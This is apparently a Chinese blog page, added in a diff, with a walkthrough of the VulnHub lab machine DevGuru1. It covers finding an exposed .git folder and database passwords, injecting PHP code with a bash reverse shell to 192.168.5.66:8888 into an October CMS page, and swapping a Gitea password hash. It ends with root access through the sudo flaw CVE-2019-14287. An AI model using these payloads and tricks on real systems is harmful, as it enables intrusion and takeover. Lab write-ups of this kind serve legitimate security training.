@@ -1,0 +1,60 @@
+<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="noindex, nofollow"><title>0x075 DevGuru1 | 养猪日记</title>
+<meta name=keywords content><meta name=description content='端口扫描
+
+
+
+
+
+
+渗透测试
+发现.git目录，通过githack下载下来，然后发现了数据库账号密码：
+
+
+&lsquo;database&rsquo;   => &lsquo;octoberdb&rsquo;,
+&lsquo;username&rsquo;   => &lsquo;october&rsquo;,
+&lsquo;password&rsquo;   => &lsquo;SQ66EBYx4GT3byXH&rsquo;,
+
+
+同时gobuster发现：
+adminer页数据库管理工具
+
+
+登录成功：
+
+
+密码hash，但是很可惜，没查到：
+
+
+但是可以添加用户：
+然后又是小技巧了，hash id 和hash-identifier认不出来，但是百度是有案例的，直接把前面一截拿到百度搜：
+
+
+
+
+
+
+研究了半天这里的漏洞利用，查了资料原来是这里就可以直接修改代码执行：
+markup:
+{{ this.page.PoisonVar }}
+
+
+code:
+function onStart()
+{
+$this->page[&ldquo;PoisonVar&rdquo;] = exec("/bin/bash -c &lsquo;bash -i >& /dev/tcp/192.168.5.66/8888 0>&amp;1&rsquo;");
+}
+
+
+点
+
+
+提权
+秒了再说：
+
+
+看一下作者留下的提权路径：'><meta name=author content="养猪日记"><link rel=canonical href=http://localhost:1313/posts/vulnhub/0x075-devguru1/><link crossorigin=anonymous href=/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY+IJWZFnspCg=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/vulnhub/0x075-devguru1/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Home (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/categories/ title=分类><span>分类</span></a></li><li><a href=http://localhost:1313/search/ title=搜索><span>搜索</span></a></li><li><a href=https://github.com/yangzhuzai title=Github><span>Github</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">0x075 DevGuru1</h1><div class=post-meta><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;98 words&nbsp;·&nbsp;养猪日记</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents></nav></div></details></div><div class=post-content><h1 id=端口扫描>端口扫描<a hidden class=anchor aria-hidden=true href=#端口扫描>#</a></h1><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEa6bd581c7fa48e8387927f35ab208b15image.png alt></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEc1ec935487287800c122de86ac7c5ca1image.png alt></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEab0eb3cd79e56fd6201ff24ccc811738image.png alt></p><h1 id=渗透测试>渗透测试<a hidden class=anchor aria-hidden=true href=#渗透测试>#</a></h1><p>发现.git目录，通过githack下载下来，然后发现了数据库账号密码：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE8dd235d87d2355774597af94e8fb30efimage.png alt></p><p>&lsquo;database&rsquo; => &lsquo;octoberdb&rsquo;,</p><p>&lsquo;username&rsquo; => &lsquo;october&rsquo;,</p><p>&lsquo;password&rsquo; => &lsquo;SQ66EBYx4GT3byXH&rsquo;,</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEbf21fb3ee14daec200095b3a301244b8image.png alt></p><p>同时gobuster发现：</p><p>adminer页数据库管理工具</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE3ced553e1389cd923303f402a70e2915image.png alt></p><p>登录成功：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE97a08d1024d194c8ab57d630ba5799b6image.png alt></p><p>密码hash，但是很可惜，没查到：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEe0771862accbd7f518a859a72f8575cdimage.png alt></p><p>但是可以添加用户：</p><p>然后又是小技巧了，hash id 和hash-identifier认不出来，但是百度是有案例的，直接把前面一截拿到百度搜：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE92ac5b683cd5ef0df12b828557a6c627image.png alt></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEd13a3917207d11119925f9abac161e5bimage.png alt></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE94324b682221c4a4caa0ddaf3cc979e5image.png alt></p><p>研究了半天这里的漏洞利用，查了资料原来是这里就可以直接修改代码执行：</p><p>markup:</p><p>{{ this.page.PoisonVar }}</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEdc09ba803a04971615e53d09065fccecimage.png alt></p><p>code:</p><p>function onStart()</p><p>{</p><p>$this->page[&ldquo;PoisonVar&rdquo;] = exec("/bin/bash -c &lsquo;bash -i >& /dev/tcp/192.168.5.66/8888 0>&amp;1&rsquo;");</p><p>}</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE8977ba30df11367a2b749669714d7359image.png alt></p><p>点</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEa76361b23e24377e0f540594b22e9401image.png alt></p><h1 id=提权>提权<a hidden class=anchor aria-hidden=true href=#提权>#</a></h1><p>秒了再说：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEed85c3d72e11a842fd81fdfb3eab3d46image.png alt></p><p>看一下作者留下的提权路径：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE9ad82454162eda220198d40c97696638image.png alt></p><p>数据库：</p><p>; Database to use. Either &ldquo;mysql&rdquo;, &ldquo;postgres&rdquo;, &ldquo;mssql&rdquo; or &ldquo;sqlite3&rdquo;.</p><p>DB_TYPE = mysql</p><p>HOST = 127.0.0.1:3306</p><p>NAME = gitea</p><p>USER = gitea</p><p>; Use PASSWD = your password for quoting if you use special characters in the password.</p><p>PASSWD = UfFPTF8C8jjxVF2m</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEd4c4b971dc31e9290ecbfbce57f60b0cimage.png alt></p><p>这里可以用mysql命令行，也可以用之前的adminer，当然图形化好一点：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE1a7746e5adf642ed47b6f9a2ddfba372image.png alt></p><p>修改密码为这个：</p><p>pbkdf2算法：</p><p>123456</p><p>4f6289d97c8e4bb7d06390ee09320a272ae31b07363dbee078dea49e4881cdda50f886b52ed5a89578a0e42cca143775d8cb</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE735b82cf09ae0d4270186b615b8d10b7image.png alt></p><p>添加反弹shell:</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE9ebc7eb7325b601c6413cc7f46ba6e17image.png alt></p><p>随便修改一个文件：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE55b5bc413dbdc5d73faa1ddafc18cdfeimage.png alt></p><p>就可以拿到</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE2d69b4d86045fa6b425400cf56ddd452image.png alt></p><p>sudo 提权：</p><p>这里利用了CVE-2019-14287 sudo权限绕过漏洞，在允许使用所有用户，但是仅仅不允许使用root用户的时候可以尝试，加上</p><p>-u#-1</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEf6513c76974a24d98418cd526f314a57image.png alt></p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=http://localhost:1313/posts/vulnhub/0x074-derpnstink1/><span class=title>« Prev</span><br><span>0x074 DerpNStink1</span>
+</a><a class=next href=http://localhost:1313/posts/vulnhub/0x076-dev-randomscream/><span class=title>Next »</span><br><span>0x076 dev randomscream</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>养猪日记</a></span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>
